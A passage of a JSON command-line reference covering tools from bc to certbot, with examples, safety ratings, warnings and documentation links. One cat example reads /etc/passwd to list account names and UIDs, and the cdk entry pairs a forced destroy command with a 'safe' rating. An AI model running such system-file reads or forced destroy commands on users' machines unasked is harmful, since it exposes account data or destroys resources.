      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complex mathematical expression",
        "commands": "echo 'scale=5; sqrt(2) * sin(3.14159/4)' | bc -l",
        "explanation": "Calculate square root of 2 times sine of pi/4",
        "title": "echo ; sqrt | bc"
      },
      {
        "scenario": "Financial calculation",
        "commands": "echo 'scale=2; 1000 * (1.05^10)' | bc -l",
        "explanation": "Compound interest: $1000 at 5% for 10 years",
        "title": "echo ; 1000 | bc"
      }
    ],
    "relatedCommands": [
      {
        "name": "dc",
        "relationship": "similar",
        "reason": "dc is reverse Polish calculator, bc uses infix"
      },
      {
        "name": "calc",
        "relationship": "alternative",
        "reason": "More advanced calculator with C-like syntax"
      },
      {
        "name": "python3",
        "relationship": "alternative",
        "reason": "Python interactive mode as calculator"
      }
    ],
    "warnings": [
      "Default precision may truncate results",
      "No built-in scientific functions without -l flag",
      "Syntax can be particular about spaces and operators"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/bc/manual/html_mono/bc.html"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/bc/manual/html_mono/bc.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bc/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL"
    }
  },
  {
    "name": "binwalk",
    "subtitle": "Binary Walk",
    "description": "Firmware analysis tool for embedded systems security",
    "examples": [
      "binwalk firmware.bin  # Identify embedded files and file systems in firmware",
      "binwalk -e firmware.bin  # Extract identified files and file systems",
      "binwalk -E firmware.bin  # Perform entropy analysis to identify encrypted/compressed sections",
      "binwalk -R '\\x00\\x01\\x02\\x03' firmware.bin  # Search for specific byte patterns in firmware",
      "binwalk -Me firmware.bin  # Extract and analyze embedded file systems from firmware"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "binwalk [options] <firmware-file>",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete firmware analysis",
        "commands": "binwalk firmware.bin && binwalk -E firmware.bin && binwalk -e firmware.bin",
        "explanation": "Analyze structure, entropy, and extract components",
        "title": "binwalk && binwalk && binwalk"
      }
    ],
    "relatedCommands": [
      {
        "name": "file",
        "relationship": "combo",
        "reason": "Identify file types found in firmware"
      },
      {
        "name": "strings",
        "relationship": "combo",
        "reason": "Extract readable strings from firmware"
      }
    ],
    "warnings": [
      "May not recognize all firmware formats",
      "Extraction success depends on format recognition",
      "Some firmware may be encrypted or obfuscated"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/ReFirmLabs/binwalk"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bitcoin-cli",
    "subtitle": "Bitcoin Command Line Interface",
    "description": "Bitcoin Core command line interface",
    "examples": [
      "bitcoin-cli getblockchaininfo  # Returns current blockchain statistics and synchronization status",
      "bitcoin-cli getbalance  # Shows current balance of the default wallet",
      "bitcoin-cli getnewaddress  # Creates a new Bitcoin receiving address",
      "bitcoin-cli sendtoaddress 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 0.1  # Sends 0.1 BTC to the specified address",
      "bitcoin-cli backupwallet /secure/backup/wallet-$(date +%Y%m%d-%H%M%S).dat  # Create timestamped wallet backup"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe", 
    "syntaxPattern": "bitcoin-cli [options] [command] [parameters]",
    "prerequisites": [
      "bitcoind",
      "bitcoin-core"
    ],
    "commandCombinations": [
      {
        "scenario": "Check node status and wallet balance",
        "commands": "bitcoin-cli getblockchaininfo && bitcoin-cli getbalance",
        "explanation": "Shows blockchain sync status and current wallet balance",
        "title": "bitcoin && bitcoin"
      }
    ],
    "relatedCommands": [
      {
        "name": "bitcoind",
        "relationship": "daemon",
        "reason": "Bitcoin daemon that bitcoin-cli communicates with"
      },
      {
        "name": "electrum",
        "relationship": "alternative",
        "reason": "Alternative Bitcoin wallet with command-line interface"
      }
    ],
    "warnings": [
      "Bitcoin daemon must be running and synced",
      "Wallet must be unlocked for sending transactions",
      "Commands may take time to complete during sync",
      "Testnet mode requires different configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://bitcoin.org/en/developer-reference#bitcoin-core-apis"
      },
      {
        "platform": "macos",
        "url": "https://bitcoin.org/en/developer-reference#bitcoin-core-apis"
      },
      {
        "platform": "windows",
        "url": "https://bitcoin.org/en/developer-reference#bitcoin-core-apis"
      },
      {
        "platform": "generic",
        "url": "https://bitcoin.org/en/developer-documentation"
      }
    ],
    "distroNotes": {
      "linux": "Available through package managers or Bitcoin Core installation",
      "windows": "Included with Bitcoin Core installation",
      "macos": "Available through Bitcoin Core installation or Homebrew"
    }
  },
  {
    "name": "blender",
    "subtitle": "Blender 3D",
    "description": "Blender 3D creation suite command line interface",
    "examples": [
      "blender -b scene.blend -a  # Renders entire animation sequence without opening GUI",
      "blender -b scene.blend -P script.py  # Runs Python script in Blender context without GUI",
      "blender -b scene.blend -s 10 -e 50 -a  # Renders frames 10 through 50 of the animation",
      "blender -b input.blend --python export_fbx.py  # Uses Python script to export blend file to FBX format",
      "blender -b scene.blend --python-expr \"import bpy; bpy.ops.export_scene.fbx(filepath='output.fbx')\"  # Export blend file to FBX format using Python script"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "blender [options] [file.blend]",
    "prerequisites": [
      "python3-optional"
    ],
    "commandCombinations": [
      {
        "scenario": "Batch process multiple blend files",
        "commands": "for file in *.blend; do blender -b \"$file\" -P process_script.py; done",
        "explanation": "Processes all blend files in directory with Python script",
        "title": "for ; do ; done"
      },
      {
        "scenario": "Render and convert to video",
        "commands": "blender -b animation.blend -a && ffmpeg -i /tmp/frame_%04d.png output.mp4",
        "explanation": "Renders animation frames then converts to MP4 using ffmpeg",
        "title": "blender && ffmpeg"
      }
    ],
    "relatedCommands": [
      {
        "name": "ffmpeg",
        "relationship": "complement",
        "reason": "Often used to convert Blender rendered frames to video formats"
      },
      {
        "name": "unity",
        "relationship": "complement",
        "reason": "Blender assets are commonly imported into Unity for game development"
      },
      {
        "name": "python3",
        "relationship": "underlying",
        "reason": "Blender scripting and automation uses Python"
      }
    ],
    "warnings": [
      "Background rendering requires properly set output paths",
      "Python scripts must be compatible with Blender's Python version",
      "GPU rendering may not work in headless mode on some systems",
      "Large scenes may require significant RAM for command-line rendering"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.blender.org/manual/en/latest/advanced/command_line/arguments.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.blender.org/manual/en/latest/advanced/command_line/arguments.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.blender.org/manual/en/latest/advanced/command_line/arguments.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.blender.org/api/current/"
      }
    ],
    "distroNotes": {
      "linux": "Available through package managers or official downloads",
      "windows": "Available as installer or portable version",
      "macos": "Available through official downloads or Homebrew"
    }
  },
  {
    "name": "brew",
    "subtitle": "Homebrew",
    "description": "Package manager for macOS and Linux",
    "examples": [
      "brew install wget  # Install wget command-line tool",
      "brew update  # Update Homebrew formulae and Homebrew itself",
      "brew upgrade  # Update all installed packages to latest versions",
      "brew search python  # Find packages related to python",
      "brew info node  # Display information about node package",
      "brew list  # Show all installed Homebrew packages",
      "brew uninstall package-name  # Remove installed package",
      "brew install --cask firefox  # Install GUI applications like Firefox",
      "brew bundle dump --file=Brewfile && brew bundle check --file=Brewfile  # Create and verify dependency manifest"
    ],
    "platform": [
      "macos",
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "brew <command> [package]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System maintenance",
        "commands": "brew update && brew upgrade && brew cleanup",
        "explanation": "Update, upgrade packages, and clean old versions",
        "title": "brew && brew && brew"
      },
      {
        "scenario": "Development environment setup",
        "commands": "brew install git node python3 && brew install --cask visual-studio-code",
        "explanation": "Install development tools and IDE",
        "title": "brew && brew"
      }
    ],
    "relatedCommands": [
      {
        "name": "mas",
        "relationship": "similar",
        "reason": "Mac App Store command line interface"
      },
      {
        "name": "port",
        "relationship": "alternative",
        "reason": "MacPorts package manager alternative"
      },
      {
        "name": "apt",
        "relationship": "similar",
        "reason": "Package manager for different platforms"
      }
    ],
    "warnings": [
      "Installs packages in /usr/local by default on Intel Macs",
      "M1 Macs use /opt/homebrew location",
      "Cask formulae for GUI applications separate from CLI tools"
    ],
    "documentation": [
      {
        "platform": "macos",
        "url": "https://docs.brew.sh/"
      },
      {
        "platform": "linux",
        "url": "https://docs.brew.sh/"
      },
      {
        "platform": "generic",
        "url": "https://docs.brew.sh/Manpage"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "btrfs",
    "subtitle": "B-tree Filesystem",
    "description": "Copy-on-write filesystem with advanced features",
    "examples": [
      "sudo btrfs subvolume create /mnt/mysubvol  # Create new Btrfs subvolume",
      "sudo btrfs subvolume list /  # List all subvolumes on filesystem",
      "sudo btrfs subvolume snapshot /home /home_snapshot  # Create read-only snapshot of /home",
      "sudo btrfs filesystem usage /  # Show filesystem usage statistics",
      "sudo btrfs filesystem balance start /  # Rebalance Btrfs filesystem",
      "sudo btrfs scrub start /  # Start data integrity check",
      "sudo btrfs subvolume snapshot /home /snapshots/home-backup  # Create read-only snapshot of home directory"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "btrfs [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Btrfs maintenance",
        "commands": "sudo btrfs filesystem usage / && sudo btrfs scrub start / && sudo btrfs filesystem balance start /",
        "explanation": "Check usage, verify integrity, rebalance filesystem",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "zfs",
        "relationship": "alternative",
        "reason": "Both are advanced copy-on-write filesystems"
      }
    ],
    "warnings": [
      "RAID 5/6 implementations still experimental",
      "Regular maintenance recommended"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://btrfs.wiki.kernel.org/index.php/Main_Page"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "buildah",
    "subtitle": "Build-ah",
    "description": "Build OCI container images without Docker daemon",
    "examples": [
      "buildah build -t myapp .  # Build container image from Dockerfile",
      "buildah from ubuntu  # Create working container from base image",
      "buildah run mycontainer -- apt-get update  # Execute command inside working container",
      "buildah copy mycontainer ./app /opt/app  # Copy local files into container filesystem",
      "buildah config --cmd '/app/start.sh' mycontainer  # Configure default command for container",
      "buildah commit mycontainer myapp:latest  # Save working container as new image"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "buildah [global-options] <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Scriptable image building",
        "commands": "buildah from alpine && buildah run alpine-working-container -- apk add curl && buildah commit alpine-working-container mycustom:latest",
        "explanation": "Create custom image by scripting buildah commands",
        "title": "buildah && buildah && buildah"
      },
      {
        "scenario": "Multi-stage build alternative",
        "commands": "buildah from golang:1.19 as builder && buildah copy builder . /src && buildah run builder -- go build -o app",
        "explanation": "Use buildah for complex multi-stage builds",
        "title": "buildah && buildah && buildah"
      }
    ],
    "relatedCommands": [
      {
        "name": "podman",
        "relationship": "combo",
        "reason": "Often used together in Red Hat container ecosystem"
      },
      {
        "name": "docker",
        "relationship": "alternative",
        "reason": "Docker build vs buildah for creating images"
      },
      {
        "name": "skopeo",
        "relationship": "combo",
        "reason": "Use skopeo to inspect images built with buildah"
      }
    ],
    "warnings": [
      "More verbose than Docker build for simple cases",
      "Powerful for scriptable and customized builds",
      "Requires understanding of OCI image format"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://buildah.io/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/containers/buildah/blob/main/docs/tutorials/01-intro.md"
      }
    ],
    "distroNotes": {
      "linux": "Native support, part of Red Hat ecosystem",
      "macos": "Limited support, better to use Docker",
      "windows": "Limited support via WSL"
    }
  },
  {
    "name": "bun",
    "subtitle": "Bun",
    "description": "Fast JavaScript runtime and package manager",
    "examples": [
      "bun run app.js  # Execute JavaScript file with Bun runtime",
      "bun install  # Install packages from package.json",
      "bun add express  # Install Express.js as dependency",
      "bun init  # Initialize new project with package.json",
      "bun dev  # Run development script from package.json",
      "bun build ./app.ts --outdir ./dist  # Bundle TypeScript for production",
      "bun upgrade  # Update Bun to latest version"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "bun <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick project setup",
        "commands": "bun init && bun add express @types/express && bun add -d typescript",
        "explanation": "Initialize project and install Express with TypeScript",
        "title": "bun && bun && bun"
      },
      {
        "scenario": "Development workflow",
        "commands": "bun install && bun run build && bun run start",
        "explanation": "Install dependencies, build, and start application",
        "title": "bun && bun && bun"
      }
    ],
    "relatedCommands": [
      {
        "name": "node",
        "relationship": "alternative",
        "reason": "Alternative JavaScript runtime"
      },
      {
        "name": "npm",
        "relationship": "alternative",
        "reason": "Bun can replace npm for package management"
      },
      {
        "name": "deno",
        "relationship": "similar",
        "reason": "Modern JavaScript runtime with built-in features"
      }
    ],
    "warnings": [
      "Still in active development, some features unstable",
      "Not all npm packages are fully compatible",
      "Different from Node.js in some runtime behaviors"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://bun.sh/docs/"
      },
      {
        "platform": "macos",
        "url": "https://bun.sh/docs/"
      },
      {
        "platform": "windows",
        "url": "https://bun.sh/docs/"
      },
      {
        "platform": "generic",
        "url": "https://bun.sh/docs/cli"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bundler",
    "subtitle": "Bundler",
    "description": "Ruby dependency manager for consistent gem environments",
    "examples": [
      "bundle install  # Install all gems listed in Gemfile",
      "bundle add rails  # Add rails gem to Gemfile and install",
      "bundle exec rails server  # Run Rails server with correct gem versions",
      "bundle update  # Update all gems to latest compatible versions",
      "bundle outdated  # List gems that have newer versions available",
      "bundle binstubs rails  # Create executable wrappers for gem binaries"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "bundle <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean bundle installation",
        "commands": "rm -rf vendor/bundle Gemfile.lock && bundle install",
        "explanation": "Remove existing bundle and reinstall fresh",
        "title": "rm && bundle"
      }
    ],
    "relatedCommands": [
      {
        "name": "gem",
        "relationship": "combo",
        "reason": "Uses gem command for package installation"
      },
      {
        "name": "ruby",
        "relationship": "combo",
        "reason": "Manages gems for Ruby applications"
      }
    ],
    "warnings": [
      "Always use bundle exec for consistent gem versions",
      "Gemfile.lock should be committed to version control",
      "Bundle path configuration affects where gems are installed"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://bundler.io/man/bundle.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "burpsuite",
    "subtitle": "Burp Suite",
    "description": "Web application security testing platform",
    "examples": [
      "java -jar burpsuite_community.jar  # Launch Burp Suite Community Edition",
      "java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner  # Run automated scan from command line (Pro version)",
      "java -jar burpsuite.jar --config-file=burp_config.json  # Start with specific configuration for automated testing",
      "java -jar burpsuite_pro.jar --project-file=test.burp --headless  # Run in headless mode for automation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "java -jar burpsuite.jar or burpsuite",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated web application testing",
        "commands": "java -jar burpsuite_pro.jar --project-file=scan.burp --config-file=config.json --headless",
        "explanation": "Fully automated web application security scan",
        "title": "java"
      }
    ],
    "relatedCommands": [
      {
        "name": "owasp-zap",
        "relationship": "similar",
        "reason": "Alternative web application security testing tool"
      },
      {
        "name": "sqlmap",
        "relationship": "combo",
        "reason": "Specialized SQL injection testing"
      }
    ],
    "warnings": [
      "Professional features require paid license",
      "Can generate significant traffic during scans",
      "Only test applications you own or have authorization"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://portswigger.net/burp/documentation"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bzip2",
    "subtitle": "Burrows-Wheeler block-sorting text compression",
    "description": "High-compression file compression utility",
    "examples": [
      "bzip2 file.txt  # Compress file.txt to file.txt.bz2",
      "bzip2 -d file.txt.bz2  # Decompress file.txt.bz2 to file.txt",
      "bzip2 -k file.txt  # Compress file while keeping original",
      "bzip2 -t file.txt.bz2  # Test integrity of compressed file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "bzip2 [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "High compression archive",
        "commands": "tar -cjf archive.tar.bz2 directory/",
        "explanation": "Create bzip2-compressed tar archive",
        "title": "tar"
      }
    ],
    "relatedCommands": [
      {
        "name": "bunzip2",
        "relationship": "alias",
        "reason": "bunzip2 is alias for bzip2 -d"
      },
      {
        "name": "gzip",
        "relationship": "alternative",
        "reason": "Different compression algorithm, gzip is faster"
      }
    ],
    "warnings": [
      "Slower than gzip but better compression ratio",
      "Uses more memory during compression"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://sourceware.org/bzip2/"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/bzip2.html"
      },
      {
        "platform": "windows",
        "url": "https://sourceware.org/bzip2/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "caddy",
    "subtitle": "Caddy",
    "description": "Modern web server with automatic HTTPS",
    "examples": [
      "caddy file-server  # Serve files from current directory with automatic HTTPS",
      "caddy run  # Start Caddy using Caddyfile configuration",
      "caddy validate  # Check Caddyfile syntax and configuration",
      "caddy reload  # Reload Caddyfile without stopping server",
      "caddy reverse-proxy --from :80 --to localhost:3000  # Proxy requests from port 80 to application on port 3000",
      "caddy fmt --overwrite  # Format and standardize Caddyfile syntax",
      "caddy version  # Display Caddy version and build information"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "caddy <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development server with proxy",
        "commands": "caddy reverse-proxy --from localhost:80 --to localhost:3000 &",
        "explanation": "Start reverse proxy in background for development",
        "title": "caddy &"
      },
      {
        "scenario": "Deploy configuration changes",
        "commands": "caddy validate && caddy reload",
        "explanation": "Validate then reload configuration",
        "title": "caddy && caddy"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "alternative",
        "reason": "Traditional web server requiring manual SSL setup"
      },
      {
        "name": "certbot",
        "relationship": "alternative",
        "reason": "Caddy handles SSL automatically vs manual certbot"
      },
      {
        "name": "curl",
        "relationship": "combo",
        "reason": "Test Caddy server responses and configuration"
      }
    ],
    "warnings": [
      "Automatic HTTPS requires valid domain and port 80/443 access",
      "Configuration syntax different from traditional web servers",
      "Binary includes many plugins by default"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://caddyserver.com/docs/"
      },
      {
        "platform": "macos",
        "url": "https://caddyserver.com/docs/"
      },
      {
        "platform": "windows",
        "url": "https://caddyserver.com/docs/"
      },
      {
        "platform": "generic",
        "url": "https://caddyserver.com/docs/quick-starts"
      }
    ],
    "distroNotes": {
      "linux": "Install from official repository or binary releases",
      "macos": "Install via Homebrew: brew install caddy",
      "windows": "Download from GitHub releases"
    }
  },
  {
    "name": "cal",
    "subtitle": "calendar",
    "description": "Display calendar",
    "examples": [
      "cal  # Show calendar for current month with today highlighted",
      "cal 12 2023  # Show calendar for December 2023",
      "cal 2023  # Show calendar for entire year 2023",
      "cal -3  # Show previous, current, and next month",
      "cal -m  # Display calendar with Monday as first day of week"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "cal [options] [month] [year]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find day of week for specific date",
        "commands": "cal 1 2023 | grep -E '^|\\b1\\b'",
        "explanation": "Check what day of the week January 1, 2023 fell on",
        "title": "cal | grep |"
      },
      {
        "scenario": "Display current date with calendar context",
        "commands": "date && cal",
        "explanation": "Show current date and time followed by month calendar",
        "title": "date && cal"
      }
    ],
    "relatedCommands": [
      {
        "name": "date",
        "relationship": "combo",
        "reason": "Display current date and time information"
      },
      {
        "name": "ncal",
        "relationship": "alternative",
        "reason": "Alternative calendar display format"
      },
      {
        "name": "at",
        "relationship": "scheduling",
        "reason": "Schedule commands for specific dates shown in calendar"
      }
    ],
    "warnings": [
      "cal uses Julian/Gregorian calendar transition in 1752",
      "Month must be specified before year in cal month year format",
      "Different cal implementations may have varying options"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cal.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cal.html"
      },
      {
        "platform": "generic",
        "url": "https://github.com/karelzak/util-linux"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "cargo",
    "subtitle": "Cargo",
    "description": "Rust package manager and build system",
    "examples": [
      "cargo new myproject  # Initialize new Rust binary project with basic structure",
      "cargo build  # Compile project and dependencies in debug mode",
      "cargo run  # Build and execute project in one command",
      "cargo test  # Execute all unit and integration tests",
      "cargo build --release  # Compile with optimizations for production deployment",
      "cargo add serde  # Add serde crate as dependency to project",
      "cargo check  # Verify code compiles without producing binary",
      "cargo fmt  # Format Rust code according to style guidelines",
      "cargo build --release --target x86_64-unknown-linux-gnu  # Cross-compile for Linux target platform",
      "cargo clippy -- -D warnings  # Run Rust linter with warnings as errors"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "cargo <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete development workflow",
        "commands": "cargo check && cargo test && cargo build --release",
        "explanation": "Verify, test, then build optimized version",
        "title": "cargo && cargo && cargo"
      },
      {
        "scenario": "Create and run new project",
        "commands": "cargo new hello_world && cd hello_world && cargo run",
        "explanation": "Initialize project, enter directory, and run",
        "title": "cargo && cd && cargo"
      }
    ],
    "relatedCommands": [
      {
        "name": "rustc",
        "relationship": "combo",
        "reason": "Cargo orchestrates rustc for building projects"
      },
      {
        "name": "npm",
        "relationship": "similar",
        "reason": "Both are package managers for their respective languages"
      },
      {
        "name": "make",
        "relationship": "alternative",
        "reason": "Build system alternative for C/C++ projects"
      }
    ],
    "warnings": [
      "cargo build vs cargo build --release have different performance",
      "Dependencies downloaded on first build can be slow",
      "Cargo.lock should be committed for applications"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://doc.rust-lang.org/cargo/"
      },
      {
        "platform": "macos",
        "url": "https://doc.rust-lang.org/cargo/"
      },
      {
        "platform": "windows",
        "url": "https://doc.rust-lang.org/cargo/"
      },
      {
        "platform": "generic",
        "url": "https://doc.rust-lang.org/cargo/getting-started/first-steps.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cat",
    "subtitle": "concatenate",
    "description": "Display file contents or concatenate files",
    "examples": [
      "cat README.md  # Display entire file contents in terminal",
      "cat file1.txt file2.txt > combined.txt  # Concatenate files and save to new file",
      "cat -n script.py  # Display file contents with numbered lines",
      "cat -A data.csv  # Show all characters including tabs and line endings",
      "cat > notes.txt  # Type content and press Ctrl+D to save to file",
      "cat /etc/passwd | awk -F: '{print $1\",\"$3\",\"$5}' | head -10  # Display user accounts with UID and description",
      "cat -b file.txt  # Number non-blank lines",
      "cat -s file.txt  # Squeeze multiple blank lines into one"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "cat [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Append timestamp to file content",
        "commands": "echo '--- Log Entry ---' && date && cat error.log",
        "explanation": "Add timestamp before displaying file contents",
        "title": "echo && date && cat"
      },
      {
        "scenario": "View compressed file contents",
        "commands": "zcat file.gz | cat -n",
        "explanation": "Uncompress and display file with line numbers",
        "title": "zcat | cat"
      }
    ],
    "relatedCommands": [
      {
        "name": "less",
        "relationship": "alternative",
        "reason": "Better for large files - paginated viewing with search"
      },
      {
        "name": "bat",
        "relationship": "alternative",
        "reason": "Modern cat replacement with syntax highlighting"
      },
      {
        "name": "head",
        "relationship": "similar",
        "reason": "View just the beginning of files"
      }
    ],
    "warnings": [
      "cat displays entire file at once - can flood terminal with large files",
      "Use less or more for viewing large files interactively",
      "cat > file overwrites existing content"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cat.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cat.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/cat-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "cd",
    "subtitle": "change directory",
    "description": "Change current working directory",
    "examples": [
      "cd  # Go to user home directory from anywhere",
      "cd -  # Switch between current and previous directory",
      "cd ..  # Navigate to parent directory",
      "cd /usr/local/bin  # Jump directly to specific directory path",
      "cd Pro[TAB]  # Use tab to autocomplete directory names",
      "cd ~/Documents && pwd  # Change to Documents directory and show current location"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "cd [directory]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Change directory and list contents",
        "commands": "cd project && ls -la",
        "explanation": "Navigate to directory and immediately see what's inside",
        "title": "cd && ls"
      },
      {
        "scenario": "Find and navigate to directory",
        "commands": "cd $(find . -name 'src' -type d | head -1)",
        "explanation": "Find first 'src' directory and navigate to it",
        "title": "cd | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "pwd",
        "relationship": "combo",
        "reason": "Shows current directory after cd operations"
      },
      {
        "name": "pushd",
        "relationship": "powerful",
        "reason": "Save current directory to stack for later return"
      },
      {
        "name": "zoxide",
        "relationship": "alternative",
        "reason": "Smart cd that learns your most-visited directories"
      }
    ],
    "warnings": [
      "cd without arguments goes to home directory",
      "Spaces in directory names require quotes or escaping",
      "cd - only remembers one previous directory"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cd.1p.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cd.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#Bourne-Shell-Builtins"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cdk",
    "subtitle": "Cloud Development Kit",
    "description": "AWS Cloud Development Kit for infrastructure as code",
    "examples": [
      "cdk init app --language typescript  # Create new CDK application with TypeScript",
      "cdk bootstrap aws://123456789012/us-east-1  # Prepare AWS environment for CDK deployments",
      "cdk synth MyStack  # Generate CloudFormation template from CDK code",
      "cdk deploy MyStack --require-approval never  # Deploy CDK stack without confirmation prompts",
      "cdk destroy MyStack --force  # Remove CDK stack and all resources",
      "cdk diff MyStack  # Compare deployed stack with local CDK code",
      "cdk list  # Show all stacks in CDK application",
      "cdk watch MyStack  # Automatically deploy on code changes",
      "cdk bootstrap && cdk deploy MyStack --require-approval never  # Bootstrap CDK and deploy stack without manual approval"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "cdk [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full deployment pipeline",
        "commands": "cdk synth && cdk diff MyStack && cdk deploy MyStack",
        "explanation": "Synthesize, review changes, then deploy stack",
        "title": "cdk && cdk && cdk"
      },
      {
        "scenario": "Multi-stack deployment",
        "commands": "cdk deploy --all --require-approval never --concurrency 2",
        "explanation": "Deploy multiple stacks concurrently without approval",
        "title": "cdk"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "CDK uses npm for package management"
      },
      {
        "name": "aws",
        "relationship": "combo",
        "reason": "CDK deploys to AWS CloudFormation"
      }
    ],
    "warnings": [
      "Requires Node.js and npm/yarn installation",
      "Bootstrap required before first deployment",
      "CDK version compatibility with construct libraries important"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.aws.amazon.com/cdk/"
      },
      {
        "platform": "macos",
        "url": "https://docs.aws.amazon.com/cdk/"
      },
      {
        "platform": "windows",
        "url": "https://docs.aws.amazon.com/cdk/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "certbot",
    "subtitle": "Certificate Bot",
    "description": "Automated SSL certificate management with Let's Encrypt",
    "examples": [
      "sudo certbot --nginx -d example.com  # Get certificate and automatically configure nginx",
      "sudo certbot --apache -d example.com  # Get certificate and configure Apache automatically",
      "sudo certbot certonly --standalone -d example.com  # Obtain certificate without web server integration",
      "sudo certbot renew  # Renew all certificates that are due for renewal",
      "sudo certbot certificates  # Show all certificates managed by certbot",
